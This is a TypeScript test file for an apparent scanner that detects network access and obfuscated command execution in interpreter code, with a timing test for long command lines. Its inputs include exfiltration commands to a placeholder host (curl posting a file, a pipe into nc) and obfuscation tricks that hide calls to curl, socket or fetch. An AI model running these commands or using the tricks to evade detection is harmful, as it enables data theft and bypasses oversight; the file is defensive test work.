import { expect, test } from "bun:test";
import { readCode } from "./interp-code.ts";
import { shellReaches } from "./provenance.ts";

// The reading of code an interpreter is given: what it opens, what it runs, what it leaves unsaid.
test("code is read for the connections it opens, the lines it runs, and what it does not say", () => {
  const py = (c: string) => readCode(c, "python");
  expect(py("import os; os.system('curl -d @n https://h.example/in')").lines).toEqual(["curl -d @n https://h.example/in"]);
  expect(py("import subprocess; subprocess.run(['curl', '-d', '@n', 'https://h.example/in'])").lines).toEqual(["curl -d @n https://h.example/in"]);
  expect(py("import subprocess; subprocess.run(['sh', '-c', 'cat n | nc h.example 80'])").lines).toEqual(["sh -c 'cat n | nc h.example 80'"]);
  expect(py("import os; os.system('cu' + 'rl x')")).toMatchObject({ lines: ["curl x"], opaque: false });
  expect(py("os.system('\\x63url x')").lines).toEqual(["curl x"]);
  expect(py("__import__('so'+'cket')").net).toBe(true);
  expect(py("import os; os.system(f'curl {u}')").opaque).toBe(true);
  expect(py("import os; os.system('curl ' + u)").opaque).toBe(true);
  expect(py("import subprocess as s; s.run(['ls'])").opaque).toBe(true);
  expect(py("exec(\"import socket\")").net).toBe(true);
  expect(py("exec(code)").opaque).toBe(true);
  // What stays quiet.
  for (const c of ["print(open('a').read())", "import os; os.system('ls -la')", "import re; re.compile('a+')", "print('see https://x.example/doc')", "import sqlite3; sqlite3.connect('a.db')", "p = re.compile(var)", "pat = re.compile(r'a(b+)c', re.M)"])
    expect([c, py(c).net, py(c).opaque]).toEqual([c, false, false]);
  const js = (c: string) => readCode(c, "js");
  // A method of an object named compile, exec or eval is no code that is built and run; the bare call and the global object's are.
  for (const c of ["const m = /a(b)/.exec(s); console.log(m)", "db.exec(sql)", "Bun.spawnSync(['ls', d])", "Bun.$`ls ${dir}`", "obj.eval(x)"]) expect([c, js(c).net, js(c).opaque]).toEqual([c, false, false]);
  for (const c of ["eval(x)", "globalThis.eval(x)", "spawnSync(cmd, [a])", "spawnSync('curl', [u])", "Bun.$`curl ${u}`", "Bun.spawnSync(['sh', '-c', x])", "const cp = require('child_process'); cp.exec(c)"]) expect([c, js(c).opaque]).toEqual([c, true]);
  expect(js("globalThis['fe'+'tch'](u)").opaque).toBe(true);
  expect(js("require('ht'+'tp').get(u)").net).toBe(true);
  expect(js("import('https://h.example/x.js')").net).toBe(true);
  expect(js("const {execSync}=require('child_process'); execSync(`curl x`)").lines).toEqual(["curl x"]);
  expect(js("execSync(`curl ${u}`)").opaque).toBe(true);
  expect(readCode("system \"curl\", \"x\";", "perl").lines).toEqual(["curl x"]);
  expect(readCode("print `curl $u`", "perl").opaque).toBe(true);
  expect(readCode("system('curl \\@n x')", "perl").opaque).toBe(false);
  expect(readCode("readfile('http://h.example/in');", "php").net).toBe(true);
  expect(readCode("print('http://h.example/in');", "php").net).toBe(false);
});

// The scan reads a command line in step with its length: a line of many calls, quotes, brackets or pieces is read in a bounded
// number of steps (past a number of calls the rest is unread), and the text of a long line is read once. (Lines of open
// brackets are the shell parser's own, which src/safety/shell-linear.test.ts bounds.)
const timed = (f: () => unknown) => {
  let best = Infinity;
  for (let k = 0; k < 3; k++) { const t = performance.now(); f(); best = Math.min(best, performance.now() - t); }
  return best;
};
const UNITS = [
  "ls /tmp/x; git status; ", "echo ls | bash; ", "x=$(ls); y=$x; ", "export A=1; ls $A/b; ", "os.system('ls'); ", "os.system(", "system(system(", "subprocess.run([", "'a'+'b'+", "'a' 'b' ", "\"a\" . \"b\" . ", "\\x41", "`", "import(", "require('x'); ", "exec(", "eval('1'); ", "a.", "'", "\"", "a ", "<<< ", "$d/", "/dev/", "$X ", "-c ", "https://h.example/ ", "x=1;",
  // lua, awk, R, PowerShell, Tcl, the sqlite3 shell, vim, emacs and gdb
  "os.execute(", "io.popen(", "f([[", "f([=[", "]]", "load(", "..", "|& ", "| getline ", "\"/inet/tcp/0/", "print | ", "system2(c(", "parse(text=", "Start-Process ", "iex ", "& ", "{ ", "exec ", "socket ", "open \"|", ".shell ", ".once |", "!", ":r !", "sil! ", "(shell-command ", "(concat \"a\" ", "(list ", "target remote ", "pipe ", "\n",
];
const line = (unit: string, n: number, wrap: string) => wrap.replace("%", unit.repeat(Math.ceil(n / unit.length)).slice(0, n));
const WRAPS = ["python3 -c '%'", "node -e '%'", "perl -e '%'", "php -r '%'", "python3 <<< '%'", "echo '%' | python3", "bash -c '%'", "echo hi > %", "python3 - <<EOF\n%\nEOF", "X='%'; python3 -c \"$X\"", "%",
  "lua -e '%'", "awk '%'", "Rscript -e '%'", "pwsh -c '%'", "tclsh <<< '%'", "sqlite3 a.db '%'", "vim -c '%' f", "emacs --eval '%'", "gdb -ex '%'", "lua - <<EOF\n%\nEOF"];

test("a command line of many calls, quotes or pieces is read in step with its length", () => {
  const slow: string[] = [];
  for (const unit of UNITS) {
    for (const wrap of WRAPS) {
      const small = timed(() => shellReaches(line(unit, 50_000, wrap), { cwd: "/w" }));
      const big = timed(() => shellReaches(line(unit, 200_000, wrap), { cwd: "/w" }));
      // Four times the text takes at most twelve times as long (and nothing under 60 ms is judged by its ratio).
      if (big > 60 && big > small * 12) slow.push(`${JSON.stringify(unit)} in ${JSON.stringify(wrap)}: ${small.toFixed(0)} ms, ${big.toFixed(0)} ms`);
      if (big > 1500) slow.push(`${JSON.stringify(unit)} in ${JSON.stringify(wrap)}: ${big.toFixed(0)} ms for 200,000 characters`);
    }
  }
  expect(slow).toEqual([]);
}, 480_000);
